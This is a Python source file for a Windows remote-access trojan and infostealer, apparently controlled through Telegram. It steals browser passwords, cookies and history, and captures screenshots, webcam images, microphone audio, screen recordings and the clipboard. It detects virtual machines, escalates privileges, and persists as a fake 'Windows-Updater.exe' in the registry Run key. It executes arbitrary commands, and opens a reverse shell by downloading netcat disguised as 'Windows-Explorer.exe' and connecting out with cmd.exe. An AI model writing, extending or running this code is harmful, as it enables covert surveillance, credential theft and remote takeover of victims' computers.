import os
import subprocess as sp
import requests
from cv2 import VideoCapture
from cv2 import imwrite
from scipy.io.wavfile import write
from sounddevice import rec, wait
import platform
import re
from urllib.request import Request, urlopen
import pyautogui
from datetime import datetime
import shutil
import sys
import threading
import json
import ctypes
import random
import libraries.uebi as uebi
import libraries.c0kix as browser_cookie
import libraries.xistori as browser_history
import libraries.ctrv as ctrv
import pyautogui
import numpy as np
import time
import imageio
import os
from libraries.u44l3t import exo
from libraries import t4l3g
import webbrowser
import ctypes
from flask import Flask
from gevent.pywsgi import WSGIServer
import threading
from libraries.p333s1st3nt import blocksites, n3v3rp4r4, st44rt4trup

def dr1v3l1st():
    try:
        drives = [f"{chr(d)}:\\" for d in range(65, 91) if os.path.exists(f"{chr(d)}:\\")]
        drive_directories = {}
        for drive in drives:
            drive_directories[drive] = [f.name for f in os.scandir(drive) if f.is_dir()]
        return drive_directories
    except Exception as e:
        return str(e)
    
def g3t_t3l3g4am(callback):
    t4l3g.telegram(callback)


def en4bl4per1():
    try:
        st44rt4trup()
        threading.Thread(target=n3v3rp4r4).start()
        blocksites()
        return True
    except Exception as e:
        return str(e)
    
def scr333nr4c(duration=15, fps=30):
    try:
        output_file = os.path.join(os.environ["temp"], "recording.mp4")
        screen_width, screen_height = pyautogui.size()
        screen_region = (0, 0, screen_width, screen_height)
        frames = []
        num_frames = duration * fps
        start_time = time.time()
        
        for _ in range(num_frames):
            img = pyautogui.screenshot(region=screen_region)
            frame = np.array(img)
            frames.append(frame)
        
        writer = imageio.get_writer(output_file, fps=fps, codec='libx264')
        for frame in frames:
            writer.append_data(frame)
        writer.close()
        
        return output_file
    except Exception as e:
        #print(f"Error during screen recording: {e}")
        return False
    
    

def c00k1():
    try:
        zip_path = browser_cookie.grab_cookies()
        if not zip_path:
            #print("No cookies found.")
            return False
        return zip_path
    except Exception as e:
        #print(f"Error obtaining cookies: {e}")
        return False




def isVM():
    rules = ['Virtualbox', 'vmbox', 'vmware']
    command = sp.Popen("SYSTEMINFO | findstr  \"System Info\"", stderr=sp.PIPE,
                       stdin=sp.DEVNULL, stdout=sp.PIPE, shell=True, text=True,
                       creationflags=0x08000000)
    out, err = command.communicate()
    command.wait()
    for rule in rules:
        if re.search(rule, out, re.IGNORECASE):
            return True
    return False


def x1s4dm1n():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
    
def adm11nrun4s():
    if not x1s4dm1n():
        # Reexecuta o script com permissões de administrador
        script = os.path.abspath(sys.argv[0])
        params = ' '.join([script] + sys.argv[1:])
        try:
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)
        except Exception as e:
            print(f"Erro ao tentar elevar permissões: {e}")
        sys.exit(0)

def g3t1p():
    try:
        IP = urlopen(Request("https://ipv4.myip.wtf/text")).read().decode().strip()
    except Exception:
        IP = "None"
    return IP


def g3tb1t():
    try:
        BITS = platform.architecture()[0]
    except Exception:
        BITS = "None"
    return BITS


def g3tus3rn4me():
    try:
        USERNAME = os.getlogin()
    except Exception:
        USERNAME = "None"
    return USERNAME


def g3tSg3t():
    try:
        OS = platform.platform()
    except Exception:
        OS = "None"
    return OS


def g3tPCU():
    try:
        CPU = platform.processor()
    except Exception:
        CPU = "None"
    return CPU


def g3th0stn4me():
    try:
        HOSTNAME = platform.node()
    except Exception:
        HOSTNAME = "None"
    return HOSTNAME


def createConfig():
    try:
        path = fr'"C:\Users\{g3tus3rn4me()}\.config"'
        new_path = path[1:]
        new_path = new_path[:-1]
        os.mkdir(new_path)
        os.system(f"attrib +h {path}")
        path = fr'C:\Users\{g3tus3rn4me()}\.config\uploads'
        os.mkdir(path)
        return True

    except WindowsError as e:
        if e.winerror == 183:
            return False
def id():
    path = fr"C:\Users\{g3tus3rn4me()}\.config\ID"
    
    def createID(file):
        ID = file.read()
        if ID == "":
            ID = random.randint(1, 10000)
            file.write(str(ID))
        return ID
    try:    
        with open(path, "r+") as IDfile:
            return createID(IDfile)

    except Exception:
        with open(path, "w+") as IDfile:
            return createID(IDfile)


def cd(path):
    try:
        os.chdir(fr"{path}")
        return True
    except Exception as e:
        return e


def pr0cess():
    result = sp.Popen("tasklist", stderr=sp.PIPE, stdin=sp.DEVNULL, stdout=sp.PIPE, shell=True, text=True,
                      creationflags=0x08000000)
    out, err = result.communicate()
    result.wait()
    return out



def uppl04d(url, name):
    path = fr'C:\Users\{g3tus3rn4me()}\.config\uploads'
    try:
        r = requests.get(url, allow_redirects=True, verify=False)
        open(fr"{path}\{name}", 'wb').write(r.content)
        return True
    except Exception as e:
        return e



def scr333nsh0t():
    try:
        Screenshot = pyautogui.screenshot()
        path = os.environ["temp"] + "\\s.png"
        Screenshot.save(path)
        return path
    except Exception as e:
        #print (e)
        return False


def webshot():
    try:
        cam = VideoCapture(0)
        ret, frame = cam.read()
        path = os.environ["temp"] + "\\p.png"
        imwrite(path, frame)
        return path
    except Exception as e:
        return False


def s3dc():  
    try:
        data = uebi.stealcreds()
        if not data:
            #print("No credentials found.")
            return False
        path = os.environ["temp"] + "\\passwords.txt"
        with open(path, 'w', encoding="utf-8") as outfile:
            for browser, creds in data.items():
                for site, details in creds.items():
                    for detail in details:
                        if detail["password"] != "No Passwords(logged in with Social Account)":
                            outfile.write(f"url: {site}\n")
                            outfile.write(f"user: {detail['username']}\n")
                            outfile.write(f"pass: {detail['password']}\n")
                            outfile.write("----------------- layn c2 ------------\n")
        return path
    except Exception as e:
        #print(f"Error obtaining credentials: {e}")
        return False




def xist0ri():
    try:
        data = browser_history.steal_history()  # Now this works
        if not data:
            #print("No history found.")
            return False
        path = os.environ["temp"] + "\\history.json"
        with open(path, 'w+') as outfile:
            json.dump(data, outfile, indent=4)
        return path
    except Exception as e:
        #print(f"Erro ao pegar historico: {e}")
        return False

def st444r5cl1p(channel):
    try:
        ctrv.st444r5cl1p(channel)
        return True
    except Exception as e:
        print(f"Error starting clipboard monitor: {e}")
        return False

def ist00pcl1p():
    try:
        ctrv.ist00pcl1p()
        return True
    except Exception as e:
        print(f"Error stopping clipboard monitor: {e}")
        return False


def p33rs111st333nt():
    st44rt4trup()
    threading.Thread(target=n3v3rp4r4, daemon=True).start()
    blocksites()
    try:
        backdoor_location = os.path.join(os.environ["appdata"], "Windows-Updater.exe")
        if not os.path.exists(backdoor_location):
            shutil.copyfile(sys.executable, backdoor_location)
            sp.call(
                f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v update /t REG_SZ /d "{backdoor_location}" /f',
                shell=True)
            return True
        else:
            return "already-enabled"
    except Exception as e:
        return str(e)


def dcm(command):
    result = sp.Popen(command.split(), stderr=sp.PIPE, stdin=sp.DEVNULL, stdout=sp.PIPE, shell=True,
                        text=True, creationflags=0x08000000)
    out, err = result.communicate()
    result.wait()
    if not err:
        return out
    else:
        return err


def selfdestruct():
    try:
        update_location = os.environ["appdata"] + "\\Windows-Updater.exe"
        config_location = fr'C:\Users\{g3tus3rn4me()}\.config'
        if os.path.exists(update_location):
            os.remove(update_location)
        if os.path.exists(config_location):
            shutil.rmtree(config_location)
        sp.call('reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /f', shell=True)
        return True

    except Exception as e:
        return e


def l0c4t1i00n():
    try:
        response = requests.get("https://json.ipv4.myip.wtf")
        response.raise_for_status()
        return response
    except Exception:
        return False


def sh33lr3vs(ip, port):
    def exec(IP, PORT):
        if not os.path.exists(os.environ["temp"] + '\\Windows-Explorer.exe'):
            r = requests.get("https://github.com/int0x33/nc.exe/raw/master/nc64.exe", allow_redirects=True,
                                    verify=False)
            open(os.environ["temp"] + '\\Windows-Explorer.exe', 'wb').write(r.content)
        else:
            try:
                result = sp.Popen(f"{os.environ['temp']}\\Windows-Explorer.exe {IP} {PORT} -e cmd.exe /b",
                                    stderr=sp.PIPE, stdin=sp.DEVNULL, stdout=sp.PIPE, shell=True, text=True,
                                    creationflags=0x08000000)
                out, err = result.communicate()
                result.wait()
                return True
            except Exception:
                return False


    threading.Thread(target=exec, args=(ip, port)).start()
    return True


def m1cr3cord(seconds):
    try:
        fs = 44100
        recording = rec(int(seconds * fs), samplerate=fs, channels=2)
        wait()
        os.chdir(fr"C:\Users\{g3tus3rn4me()}\.config\uploads")
        write('recording.wav', fs, recording)
        path = fr"C:\Users\{g3tus3rn4me()}\.config\uploads\recording.wav"
        return path
    except Exception as e:
        print(e)
        return False


def w4llppp4p3r(path):
    if path.startswith("http" or "https"):
        try:
            wallpaper_name = f"wallpaper.{path[-3:]}"
            r = requests.get(path, allow_redirects=True, verify=False)
            open(fr"C:\Users\{g3tus3rn4me()}\.config\uploads\{wallpaper_name}", 'wb').write(r.content)
            wallpaper_location = fr"C:\Users\{g3tus3rn4me()}\.config\uploads\{wallpaper_name}"
            ctypes.windll.user32.SystemParametersInfoW(20, 0, wallpaper_location, 0)
            return True
        except Exception as e:
            return e
    else:
        try:
            ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)
            return True
        except Exception as e:
            return e


def k1llpr0cccc(pid):
    result = sp.Popen(f"taskkill /F /PID {pid}", stderr=sp.PIPE, stdin=sp.DEVNULL, stdout=sp.PIPE,
                        shell=True, text=True, creationflags=0x08000000)
    out, err = result.communicate()
    result.wait()
    if err:
        return err
    else:
        return True

